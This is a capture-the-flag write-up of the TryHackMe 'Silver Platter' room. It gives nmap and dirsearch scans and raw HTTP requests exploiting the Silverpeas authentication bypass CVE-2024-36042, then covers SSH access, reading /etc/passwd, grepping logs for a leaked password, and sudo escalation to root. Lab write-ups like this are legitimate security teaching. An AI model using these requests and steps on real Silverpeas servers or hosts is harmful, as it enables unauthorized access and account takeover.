---
title: Silver Platter - tryhackme, TeneBrae93
date: 2025-02-13 11:27:10 -5000
categories: [THM,Easy,Linux]
tags: [Web,Misconfiguration,authentication bypass]
---

Can you breach the server?

![SilverPlatter.png](Assets/Pictures/SilverPlatter/SilverPlatter.png)
Today, in this **write-up**, I’ll walk through the solution to the [Silver Platter](https://tryhackme.com/room/silverplatter) room on TryHackMe. This beginner-friendly challenge covers the basics of **penetration testing**, making it a great starting point for **newcomers**.

---

## Nmap Scan
To start, I performed a basic **Nmap** scan.
````console
nmap -sC -sV -T4 SilverPlatter.thm
Nmap scan report for SilverPlatter.thm
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Fri, 14 Feb 2025 06:20:42 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg,
|   SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest, HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Fri, 14 Feb 2025 06:20:41 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 97.21 seconds
````
The scan revealed `three` **open ports:**
- `Port 22` (SSH) Running OpenSSH 8.9p1 (Ubuntu), potentially useful if i find valid credentials
- `Port 80` (HTTP) is hosting a web server (nginx), which could lead to further enumeration.
- `Port 8080` (HTTP Proxy) returns errors and might require further analysis.

---

## Manual Investigation
I visited the website hosted on port `80` and port `8080` to check for any interesting content.
![SilverPlatterContact.png](Assets/Pictures/SilverPlatter/SilverPlatterContact.png)
I discovered **two** crucial pieces of information during my investigation:
1. The project manager's username is `scr1ptkiddy`.
2. The project manager is using `Silverpeas`, a collaborative web platform.

---

## Dirsearch
Next i'll use `Dirsearch` to scan for hidden directories on the website.
````console
dirsearch -u http://silverplatter.thm:8080 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 207628

Target: http://silverplatter.thm:8080/

[12:05:33] Starting:
[12:05:46] 302 -    0B  - /website  ->  http://silverplatter.thm:8080/website/
[12:06:06] 302 -    0B  - /console  ->  /noredirect.html

Task Completed
````
Scanning port `80` with Dirserch didn’t give any useful results. But, when i scanned port `8080`, found two results:
- `/website`: Redirects to `http://silverplatter.thm:8080/website/`
![forbidden-website.PNG](Assets/Pictures/SilverPlatter/forbidden-website.PNG)
- `/console`: Redirects to `/noredirect.html`
![404-not-found.PNG](Assets/Pictures/SilverPlatter/404-not-found.PNG)
Unfortunately, both directories appear to be **unhelpful** for me.

---

## Silverpeas
But wait—we have a hint: **Silverpeas**. Since we know the project manager is using Silverpeas.
![silverpeasloginpage.png](Assets/Pictures/SilverPlatter/silverpeasloginpage.png)
After visiting `/silverpeas` as a potential directory, I found the Silverpeas **login** page.

---

### Research
We need to research about `Silverpeas` to identify potential vulnerabilities.
![CVE-2024-36042.png](Assets/Pictures/SilverPlatter/CVE-2024-36042.png)
After digging, I found discovered known vulnerability in `Silverpeas`.

**Silverpeas** versions up to and including **6.3.4** are vulnerable to a **trivial authentication bypass**. submitting login credentials, if the password field is left **empty**, the application **automatically grants access** to the specified user without any authentication challenge. For example, a standard login request typically looks like this:
````console
POST /silverpeas/AuthenticationServlet HTTP/2
Host: 212.129.58.88
Content-Length: 28
Origin: https://212.129.58.88
Content-Type: application/x-www-form-urlencoded

Login=SilverAdmin&Password=SilverAdmin&DomainId=0
````
This login attempt will **fail** unless the user is still using the **default password**, in which case access may be granted. Otherwise, you'll be redirected back to the **login page** with an error message. However, if we **completely remove** the password field from the request, like this:
````console
POST /silverpeas/AuthenticationServlet HTTP/2
Host: 212.129.58.88
Content-Length: 28
Origin: https://212.129.58.88
Content-Type: application/x-www-form-urlencoded

Login=SilverAdmin&DomainId=0
````
Then the login attempt will (usually) succeed and redirect you to the main page.

---

### Exploitation
The provided `PoC` works flawlessly, I was able to log in as `scr1ptkiddy` without even needing a password.

- By crafting Burpsuite Request like this:
````console
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: silverplatter.thm:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://silverplatter.thm:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Login=scr1ptkiddy&DomainId=0
````

After accessing the `Silverpeas` Dashboard,
![silverpeasloginpage.png](Assets/Pictures/SilverPlatter/login-success.png)
I discovered two additional **user accounts**: 
1. `Administrateur`
2. `Manager`

I decided to test both, and guess what? The `Manager` account works! 

---
From manager's messages:
````plaintext
Dude how do you always forget the SSH password? 
Use a password manager and quit using your silly sticky notes. 
Username: tim
Password: [REDACTED]
````
---

## SSH
Now that I have a valid **username** & **password**, I can use them to establish an `ssh` connection.
````shell
ssh tim@SilverPlatter.thm
tim@silverplatter.thm's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System load:  0.080078125       Processes:                124
  Usage of /:   89.9% of 8.33GB   Users logged in:          0
  Memory usage: 60%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    10.10.50.90

  => / is using 89.9% of 8.33GB

tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
tim@silver-platter:~$ ls -la
total 12
dr-xr-xr-x 2 root root 4096 Dec 13  2023 .
drwxr-xr-x 4 root root 4096 Dec 13  2023 ..
-rw-r--r-- 1 root root   38 Dec 13  2023 user.txt
tim@silver-platter:~$ cat user.txt
[REDACTED]
tim@silver-platter:~$
````
Once inside, I successfully retrieve the user **flag!**

## Privilege Escalation
Now, I need to **escalate privileges** to `root` in order to retrieve the  **root flag**. Time to enumerate the system and look for potential `privilege escalation` vectors!
````shell
tim@silver-platter:/$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
tim@silver-platter:/$ 
````
Upon enumeration `tim` group, I see that he belongs to the `adm` group. This grants access to `/var/log/`.
```shell
tim@silver-platter:/$ cat /etc/passwd
tyler:x:1000:1000:root:/home/tyler:/bin/bash
````
& I also discovered another user, `tyler`. Now, let's search the logs for any entries related to the user `tyler`.
````shell
tim@silver-platter:/$ grep -a 'tyler' /var/log/*
New session 1 of user tyler.
tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql \
-d -e POSTGRES_PASSWORD=[REDACTED]
```` 
I used `POSTGRES_PASSWORD` to switch to the `tyler` user, and it worked.
````shell
tim@silver-platter:/var/log$ su tyler
Password:
tyler@silver-platter:/var/log$ cd ~
tyler@silver-platter:~$ id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),
4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
tyler@silver-platter:~$ 
````
This user has unrestricted sudo privileges, allowing them to execute any command as root. With a simple `sudo su`, I elevate privileges to `root`.
````shell
tyler@silver-platter:~$ sudo su
[sudo] password for tyler:
root@silver-platter:/home/tyler# cd /root/
root@silver-platter:~# cat root.txt
[REDACTED]
````
Navigating to the `/root/` directory, I finally retrieve the **root flag**,
![SilverplatterSolved.png](Assets/Pictures/SilverPlatter/SilverplatterSolved.png)
completing the [Silver-Platter](https://tryhackme.com/room/silverplatter) room!

---

## Happy hacking !
Here are some resources:
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36042](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36042)
* [https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)